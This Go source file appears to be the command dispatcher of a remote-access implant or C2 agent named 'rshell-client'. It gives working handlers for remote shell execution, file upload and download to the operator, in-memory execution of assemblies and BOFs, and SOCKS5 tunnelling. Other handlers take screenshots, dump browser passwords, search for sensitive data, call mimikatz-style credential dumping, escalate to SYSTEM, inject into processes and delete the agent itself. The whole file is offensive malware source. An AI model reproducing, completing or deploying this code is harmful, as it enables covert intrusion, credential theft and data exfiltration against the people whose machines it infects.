package services

import (
	"bytes"
	"crypto/md5"
	"crypto/rand"
	"errors"
	"fmt"
	"io"
	"math/big"
	"os"
	"path/filepath"
	"rshell-client/shared/commands"
	"rshell-client/shared/config"
	"rshell-client/shared/link"
	"rshell-client/shared/psutil"
	"rshell-client/shared/sysinfo"
	"rshell-client/shared/utils"
	"strconv"
	"strings"
	"time"
)

func init() {
	commands.SetDumpOutputFn(func(ct int, data []byte) {
		link.ReportData(ct, data)
	})
}

func HideConsole() error {
	return commands.HideConsole()
}
func ProcessDPIAware() error {
	return commands.SetProcessDPIAware()
}

// pathLen(4) | path(pathLen) | cmdLen(4) | cmd(cmdLen)
func ParseCommandShell(b []byte) (string, []byte, error) {
	buf := bytes.NewBuffer(b)
	pathLenBytes := make([]byte, 4)
	_, err := buf.Read(pathLenBytes)
	if err != nil {
		return "", nil, err
	}
	pathLen := utils.ReadInt(pathLenBytes)
	path := make([]byte, pathLen)
	_, err = buf.Read(path)
	if err != nil {
		return "", nil, err
	}

	cmdLenBytes := make([]byte, 4)
	_, err = buf.Read(cmdLenBytes)
	if err != nil {
		return "", nil, err
	}

	cmdLen := utils.ReadInt(cmdLenBytes)
	cmd := make([]byte, cmdLen)
	buf.Read(cmd)

	// 替换path中的env的路径
	envKey := strings.ReplaceAll(string(path), "%", "")
	app := os.Getenv(envKey)
	return app, cmd, nil
}

// filePathLen(4) | fileContent(filePathLen)
func ParseCommandUpload(b []byte) ([]byte, []byte) {
	buf := bytes.NewBuffer(b)
	filePathLenBytes := make([]byte, 4)
	buf.Read(filePathLenBytes)
	filePathLen := utils.ReadInt(filePathLenBytes)
	filePath := make([]byte, filePathLen)
	buf.Read(filePath)
	fileContent := buf.Bytes()
	return filePath, fileContent

}
func CmdShell(cmdBuf []byte) ([]byte, error) {
	//shellPath, shellBuf, err := ParseCommandShell(cmdBuf)
	//if err != nil {
	//	return nil, err
	//}
	go func() {
		_, err := commands.Shell("", cmdBuf)
		if err != nil {
			link.ReportError(err)
		}
		return
	}()
	return []byte("[+] command is executing"), nil
}

func CmdUpload(cmdBuf []byte, isStart bool) ([]byte, error) {
	filePath, fileData := ParseCommandUpload(cmdBuf)
	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
	_, err := Upload(filePathStr, fileData, isStart)
	if err != nil {
		return nil, err
	}
	return []byte("[+] " + filePathStr + " file upload " + strconv.Itoa(len(fileData)) + " bytes."), nil
}

func Upload(filePath string, fileContent []byte, isStart bool) (int, error) {
	var fp *os.File
	var err error
	if isStart {
		// if file exist, need user delete it manually before upload
		fp, err = os.OpenFile(filePath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, os.ModePerm)
	} else {
		fp, err = os.OpenFile(filePath, os.O_APPEND|os.O_WRONLY, os.ModePerm)
	}
	if err != nil {
		return 0, errors.New("file create err: " + err.Error())
	}
	defer fp.Close()
	offset, err := fp.Write(fileContent)
	if err != nil {
		return 0, errors.New("file write err: " + err.Error())
	}
	return offset, nil
}

// requestID || fileLen || filePath
// requestID || fileContent
func CmdDownload(cmdBuf []byte) ([]byte, error) {
	filePath := cmdBuf
	strFilePath := string(filePath)
	filePathLenBytes := utils.WriteInt(len(filePath))
	strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
	go func() {
		fileInfo, err := os.Stat(strFilePath)
		if err != nil {
			link.ReportError(err)
			return
		}
		fileLen := fileInfo.Size()
		test := int(fileLen)
		fileLenBytes := utils.WriteInt(test)
		result := utils.BytesCombine(fileLenBytes, filePath)
		link.ReportData(22, result)

		fileHandle, err := os.Open(strFilePath)
		if err != nil {
			link.ReportError(err)
			return
		}
		var fileContent []byte
		fileBuf := make([]byte, 2000000)
		for {
			n, err := fileHandle.Read(fileBuf)
			if err != nil && err != io.EOF {
				break
			}
			if n == 0 {
				break
			}
			fileContent = fileBuf[:n]
			result = utils.BytesCombine(filePathLenBytes, filePath, fileContent)
			link.ReportData(DOWNLOAD, result)
			time.Sleep(50 * time.Millisecond)
		}
		link.ReportData(0, []byte("[+] "+strFilePath+" download success"))
	}()

	return []byte("[+] Downloading " + strFilePath), nil
}

// pendingRequest(4) || dirPathLen(4) || dirPath(dirPathLen)
func CmdFileBrowse(dirPathBytes []byte) ([]byte, error) {

	// list files
	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")

	fileInfo, err := os.Stat(dirPathStr)
	if err != nil {
		return nil, err
	}
	modTime := fileInfo.ModTime()
	// 修复：用 dirPathStr 计算绝对路径，而不是 fileInfo.Name()
	// fileInfo.Name() 只返回目录名（如 "tmp"），filepath.Abs 会拼接到当前工作目录下得到错误路径
	absCurrentDir, err := filepath.Abs(dirPathStr)
	if err != nil {
		return nil, err
	}
	modTimeStr := modTime.Format("2006/01/02 15:04:05")
	resultStr := ""
	if dirPathStr == "./" {
		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
	} else {
		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
	}
	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
	entries, err := os.ReadDir(dirPathStr)
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}
		modTimeStr = info.ModTime().Format("02/01/2006 15:04:05")

		if entry.IsDir() {
			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, entry.Name())
		} else {
			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", info.Size(), modTimeStr, entry.Name())
		}
	}

	return []byte(resultStr), nil

}

// filepath
func CmdCd(cmdBuf []byte) ([]byte, error) {
	err := os.Chdir(string(cmdBuf))
	if err != nil {
		return nil, err
	}
	return []byte("changing directory success"), nil
}

// ms(4)
func CmdSleep(cmdBuf []byte) ([]byte, error) {
	sleep := utils.ReadInt(cmdBuf[:4])
	if sleep != 'd' {
		config.WaitTime = time.Duration(sleep) * time.Millisecond
		return []byte("Sleep time changes to " + strconv.Itoa(int(sleep)/1000) + " seconds"), nil
	}
	return nil, nil
}

func CmdPwd() ([]byte, error) {
	pwd, err := os.Getwd()
	result, err := filepath.Abs(pwd)
	if err != nil {
		return nil, err
	}
	return []byte(result), nil
}

func CmdPause(cmdBuf []byte) ([]byte, error) {
	pauseTime := utils.ReadInt(cmdBuf)
	fmt.Println(fmt.Sprintf("Pause time: %d", pauseTime))
	time.Sleep(time.Duration(pauseTime) * time.Millisecond)
	return []byte(fmt.Sprintf("Pause for %d millisecond", pauseTime)), nil
}

func CmdExit() ([]byte, error) {
	_, err := commands.DeleteSelf()
	if err != nil {
		return nil, err
	}
	return []byte("success exit"), nil
}

func CmdExecute(cmdBuf []byte) ([]byte, error) {
	return commands.Execute(cmdBuf)
}

func CmdPs() ([]byte, error) {
	processes, err := psutil.Processes()
	if err != nil {
		return nil, err
	}
	result := fmt.Sprintf("\n%s\t\t\t%s\t\t\t%s\t\t\t%s\t\t\t%s", "Process Name", "pPid", "pid", "Arch", "User")
	for _, p := range processes {
		pid := p.Pid
		pPid := p.PPid
		name := p.Name
		owner, _ := psutil.Username(pid)
		if owner == "" {
			owner = p.Username
		}
		sessionId := sysinfo.GetProcessSessionId(pid)
		var archString string
		IsX64, err := sysinfo.IsPidX64(uint32(pid))
		if err != nil {
			return nil, err
		}
		if IsX64 {
			archString = "x64"
		} else {
			archString = "x86"
		}

		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
	}

	return []byte(result), nil
}

func CmdKill(cmdBuf []byte) ([]byte, error) {
	pid := utils.ReadInt(cmdBuf[:4])
	return commands.KillProcess(pid)
}

func CmdMkdir(cmdBuf []byte) ([]byte, error) {
	if PathExists(string(cmdBuf)) {
		return nil, errors.New("Directory exists")
	}
	err := os.Mkdir(string(cmdBuf), os.ModePerm)
	if err != nil {
		return nil, errors.New("Mkdir failed")
	}
	return []byte("Mkdir success: " + string(cmdBuf)), nil
}

func PathExists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return false
}

func CmdDrives() ([]byte, error) {
	return commands.Drives()
}

func CmdRm(cmdBuf []byte) ([]byte, error) {
	Path := strings.ReplaceAll(string(cmdBuf), "\\", "/")
	err := os.RemoveAll(Path)
	if err != nil {
		return nil, errors.New("Remove failed")
	}
	return []byte("Remove " + string(cmdBuf) + " success"), nil
}

func CmdCp(cmdBuf []byte) ([]byte, error) {
	buf := bytes.NewBuffer(cmdBuf)
	arg, err := utils.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	src := string(arg)
	arg, err = utils.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	dest := string(arg)
	bytesRead, err := os.ReadFile(src)
	if err != nil {
		return nil, err
	}
	fp, err := os.OpenFile(dest, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		return nil, err
	}
	defer fp.Close()
	_, err = fp.Write(bytesRead)
	if err != nil {
		return nil, err
	}

	return []byte("Copy " + src + " to " + dest + " success"), nil
}

func CmdMv(cmdBuf []byte) ([]byte, error) {
	buf := bytes.NewBuffer(cmdBuf)
	arg, err := utils.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	src := string(arg)
	arg, err = utils.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	dest := string(arg)
	err = os.Rename(src, dest)
	if err != nil {
		return nil, err
	}

	return []byte("Move " + src + " to " + dest + " success"), nil
}
func CallbackTime() (time.Duration, error) {
	waitTime := config.WaitTime.Milliseconds()
	jitter := int64(8)
	if jitter <= 0 || jitter > 100 {
		return config.WaitTime, nil
	}
	result, err := rand.Int(rand.Reader, big.NewInt(2*waitTime/100*jitter))
	if err != nil {
		return config.WaitTime, err
	}
	waitTime = result.Int64() + waitTime - waitTime/100*jitter
	return time.Duration(waitTime) * time.Millisecond, nil
}
func GetFileContent(cmdBuf []byte) ([]byte, error) {
	filePathLen := len(cmdBuf)
	fileLenBytes := utils.WriteInt(filePathLen)

	filePath := string(cmdBuf)
	_, err := os.Stat(string(cmdBuf))
	if err != nil {
		link.ReportError(err)
		return nil, err
	}

	// 打开文件
	file, err := os.Open(filePath)
	if err != nil {
		link.ReportError(err)
		return nil, err
	}
	defer file.Close()

	buffer := make([]byte, 10000)

	// 读取前 10000 字节的内容
	n, err := file.Read(buffer)
	if err != nil {
		link.ReportError(err)
		return nil, err
	}

	result := utils.BytesCombine(fileLenBytes, cmdBuf, buffer[:n])
	link.ReportData(FileContent, result)

	return []byte("reading file" + filePath), nil

}
func ProcessSocks5Data(cmdBuf []byte) ([]byte, error) {
	rawData := processNeoreg(cmdBuf)
	md5sign := md5.Sum(cmdBuf)
	link.ReportData(Socks5Data, append(md5sign[:], rawData...))
	return nil, nil
}

// len(file) || file || args
func Execute_Assembly(b []byte) ([]byte, error) {
	buf := bytes.NewBuffer(b)
	fileLenBytes := make([]byte, 4)
	buf.Read(fileLenBytes)
	fileLen := utils.ReadInt(fileLenBytes)
	fileContent := make([]byte, fileLen)
	buf.Read(fileContent)
	args := buf.String()
	if args == "<nil>" {
		args = ""
	}

	result, err := commands.ExecuteAssembly(fileContent, args)
	return result, err

}

func Inline_bin(b []byte) ([]byte, error) {
	commands.Inline_Bin(b)
	return nil, nil
}
func Inline_Execute(b []byte) ([]byte, error) {
	buf := bytes.NewBuffer(b)
	fileLenBytes := make([]byte, 4)
	buf.Read(fileLenBytes)
	fileLen := utils.ReadInt(fileLenBytes)
	bofContent := make([]byte, fileLen)
	buf.Read(bofContent)
	args := buf.String()
	if args == "<nil>" {
		args = ""
	}
	result, err := commands.Inline_Execute(bofContent, args)
	return result, err
}

func CmdScreenshot() ([]byte, error) {
	imgData, err := CaptureScreen()
	if err != nil {
		return nil, err
	}
	link.ReportData(SCREENSHOT, imgData)
	return []byte("screenshot captured"), nil
}

// Interactive_Shell 创建交互式shell会话
func Interactive_Shell(b []byte) ([]byte, error) {
	sessionID := string(b)
	sm := GetSessionManager()

	// 检查会话是否已存在
	if _, err := sm.GetSession(sessionID); err == nil {
		// 会话已存在，返回成功
		return nil, err
	}

	// 创建新会话
	_, err := sm.NewSession(sessionID, 120, 60)
	if err != nil {
		return nil, err
	}

	return nil, nil
}

// Write_Interactive_Shell 向指定会话写入命令
func Write_Interactive_Shell(b []byte) ([]byte, error) {
	// 解析请求
	buf := bytes.NewBuffer(b)
	sessionIdLenByte := make([]byte, 4)
	buf.Read(sessionIdLenByte)
	sessionIdLen := utils.ReadInt(sessionIdLenByte)
	sessionId := make([]byte, sessionIdLen)
	buf.Read(sessionId)
	command := buf.Bytes()

	sm := GetSessionManager()

	// 获取会话
	session, err := sm.GetSession(string(sessionId))
	if err != nil {
		return nil, err
	}

	// 发送命令并等待输出
	session.Write(command)

	// if err != nil {
	// 	return nil, err
	// }

	// // 等待输出稳定（简单实现）
	// time.Sleep(100 * time.Millisecond)

	// // 读取最终输出
	// finalOutput := session.ReadOutput()
	// if finalOutput == nil {
	// 	finalOutput = output
	// }
	// link.ReportData(WriteInteractieShell, finalOutput)
	return nil, nil
}

// Close_Interactive_Shell 关闭会话
func Close_Interactive_Shell(b []byte) ([]byte, error) {
	sessionID := string(b)
	sm := GetSessionManager()

	err := sm.CloseSession(sessionID)
	if err != nil {
		return nil, err
	}

	return nil, nil
}

// CmdDumpBrowser 浏览器密码抓取
func CmdDumpBrowser(b []byte) ([]byte, error) {
	uid := strings.TrimSpace(string(b))
	go func() {
		commands.DumpBrowser(uid)
		link.ReportData(0, []byte("[+] 浏览器密码抓取完成"))
	}()
	return []byte("[+] 浏览器密码抓取已启动..."), nil
}

// CmdSearchSensitive 敏感信息搜索
func CmdSearchSensitive(b []byte) ([]byte, error) {
	path := strings.TrimSpace(string(b))
	go func() {
		defer func() {
			if r := recover(); r != nil {
				errMsg := fmt.Sprintf("[!] 敏感信息搜索异常: %v\n", r)
				link.ReportData(0, []byte(errMsg))
			}
		}()
		commands.SearchSensitive(path)
		link.ReportData(0, []byte("[+] 敏感信息搜索完成\n"))
	}()
	return []byte("[+] 敏感信息搜索已启动...\n"), nil
}

// ExecuteLinuxBin 执行Linux二进制（tmp落地执行后删除）
// len(file) || file || args
func ExecuteLinuxBin(b []byte) ([]byte, error) {
	buf := bytes.NewBuffer(b)
	fileLenBytes := make([]byte, 4)
	buf.Read(fileLenBytes)
	fileLen := utils.ReadInt(fileLenBytes)
	fileContent := make([]byte, fileLen)
	buf.Read(fileContent)
	args := buf.String()
	if args == "<nil>" {
		args = ""
	}

	result, err := commands.ExecuteLinuxBin(fileContent, args)
	return result, err
}

// ExecuteLinuxScript 执行Linux脚本
// len(file) || file || args
func ExecuteLinuxScript(b []byte) ([]byte, error) {
	buf := bytes.NewBuffer(b)
	fileLenBytes := make([]byte, 4)
	buf.Read(fileLenBytes)
	fileLen := utils.ReadInt(fileLenBytes)
	fileContent := make([]byte, fileLen)
	buf.Read(fileContent)
	args := buf.String()
	if args == "<nil>" {
		args = ""
	}

	result, err := commands.ExecuteLinuxScript(fileContent, args)
	return result, err
}

func DispatchCommand(cmdType uint32, cmdBuf []byte) (result []byte, callbackType int, err error) {
	switch cmdType {
	case SHELL:
		result, err = CmdShell(cmdBuf)
		callbackType = 0
	case UploadStart:
		result, err = CmdUpload(cmdBuf, true)
		callbackType = 0
	case UploadLoop:
		result, err = CmdUpload(cmdBuf, false)
		callbackType = 0
	case DOWNLOAD:
		result, err = CmdDownload(cmdBuf)
		callbackType = 0
	case FileBrowse:
		result, err = CmdFileBrowse(cmdBuf)
		callbackType = int(FileBrowse)
	case CD:
		result, err = CmdCd(cmdBuf)
		callbackType = 0
	case SLEEP:
		result, err = CmdSleep(cmdBuf)
		callbackType = 0
	case PAUSE:
		result, err = CmdPause(cmdBuf)
		callbackType = 0
	case PWD:
		result, err = CmdPwd()
		callbackType = 0
	case EXIT:
		result, err = CmdExit()
		callbackType = 0
	case EXECUTE:
		result, err = CmdExecute(cmdBuf)
		callbackType = 0
	case PS:
		result, err = CmdPs()
		callbackType = int(PS)
	case KILL:
		result, err = CmdKill(cmdBuf)
		callbackType = 0
	case MKDIR:
		result, err = CmdMkdir(cmdBuf)
		callbackType = 0
	case DRIVES:
		result, err = CmdDrives()
		callbackType = int(DRIVES)
	case RM:
		result, err = CmdRm(cmdBuf)
		callbackType = 0
	case CP:
		result, err = CmdCp(cmdBuf)
		callbackType = 0
	case MV:
		result, err = CmdMv(cmdBuf)
		callbackType = 0
	case FileContent:
		result, err = GetFileContent(cmdBuf)
		callbackType = 0
	case ExecuteAssembly:
		result, err = Execute_Assembly(cmdBuf)
		callbackType = 0
	case InlineBin:
		result, err = Inline_bin(cmdBuf)
		callbackType = 0
	case Socks5Data:
		result, err = ProcessSocks5Data(cmdBuf)
		callbackType = -1
	case InlineExecute:
		result, err = Inline_Execute(cmdBuf)
		callbackType = 0
	case InteractiveShell:
		result, err = Interactive_Shell(cmdBuf)
		callbackType = -1
	case WriteInteractieShell:
		result, err = Write_Interactive_Shell(cmdBuf)
		callbackType = -1
	case StopInteractiveShell:
		result, err = Close_Interactive_Shell(cmdBuf)
		callbackType = -1
	case SCREENSHOT:
		result, err = CmdScreenshot()
		callbackType = 0
	case LinuxScript:
		result, err = ExecuteLinuxScript(cmdBuf)
		callbackType = 0
	case LinuxBinMem:
		result, err = ExecuteLinuxBin(cmdBuf)
		callbackType = 0
	case SearchSensitive:
		result, err = CmdSearchSensitive(cmdBuf)
		callbackType = 0
	case DumpBrowser:
		result, err = CmdDumpBrowser(cmdBuf)
		callbackType = 0
	case GETSYSTEM:
		result, err = commands.GetSystemCmd(cmdBuf)
		callbackType = 0
	case MIMIKATZ:
		result, err = commands.DumpCredentials()
		callbackType = 0
	case PROCESS_INJECT:
		result, err = commands.InjectProcess(cmdBuf)
		callbackType = 0
	case LIST_PROCESSES:
		result, err = commands.ListProcesses()
		callbackType = int(LIST_PROCESSES)
	default:
		err = fmt.Errorf("unknown command type: %d", cmdType)
	}
	return
}
